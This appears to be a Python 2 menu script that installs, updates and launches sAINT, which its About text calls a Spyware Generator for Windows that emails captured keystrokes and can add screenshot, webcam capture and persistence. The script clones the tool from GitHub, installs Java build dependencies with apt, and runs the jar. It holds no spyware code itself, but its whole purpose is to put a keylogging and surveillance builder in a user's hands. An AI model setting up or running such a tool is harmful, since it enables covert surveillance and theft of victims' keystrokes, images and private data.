#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author          :SimplyPancake
#python_version  :2.7.6
#=======================================================================

# Import the modules needed to run the script.
import sys, os

# Main definition - constants
menu_actions  = {}

# =======================
#     MENUS FUNCTIONS
# =======================

# Main menu
def main_menu():
    os.system('clear')

    print """
 ██╗███████╗██╗  █████╗ ██╗███╗   ██╗████████╗
██╔╝██╔════╝╚██╗██╔══██╗██║████╗  ██║╚══██╔══╝
██║ ███████╗ ██║███████║██║██╔██╗ ██║   ██║
██║ ╚════██║ ██║██╔══██║██║██║╚██╗██║   ██║
╚██╗███████║██╔╝██║  ██║██║██║ ╚████║   ██║
 ╚═╝╚══════╝╚═╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝

_______________
|     By      |
|SimplyPancake|
|_____________|
(\__/) ||
(•ㅅ•) ||
/ 　 \づ
	  """
    print "What to do with sAINT?:"
    print "1. Run sAINT"
    print "2. Install sAINT"
    print "3. Update sAINT"
    print "a. About this tool"
    print "\n99. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)

    return

# Execute menu
def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, please try again.\n"
            menu_actions['main_menu']()
    return

# run
def run():
    os.system('java -jar sAINT/sAINT.jar')
    return

#update
def updt():
    os.system('cd sAINT && sudo git pull')
    os.system('clear')
    os.system('python insSM.py')

#install
def install():
    os.system('apt install maven default-jdk default-jre openjdk-8-jdk openjdk-8-jre -y')
    os.system('apt install zlib1g-dev libncurses5-dev lib32z1 lib32ncurses5 -y')
    os.system('git clone https://github.com/tiagorlampert/sAINT.git')
    os.system('chmod +x sAINT/configure.sh')
    os.system('cd sAINT && ./configure.sh')
    os.system('clear')
    os.system('python insSM.py')

#about
def about():
    print"""
👁 (s)AINT is a Spyware Generator for Windows systems written in Java.
On Windows, install the latest Java JRE 8 from Oracle.
E-mail will be sent when it reaches the specified number of characters.
Optionally you can enable Screenshot, Webcam Capture and Persistence.
    """


# Exit program
def exit():
    sys.exit()

# =======================
#    MENUS DEFINITIONS
# =======================

# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': run,
    '2': install,
    '3': updt,
    'a': about,
    '99': exit,
}

# =======================
#      MAIN PROGRAM
# =======================

# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()
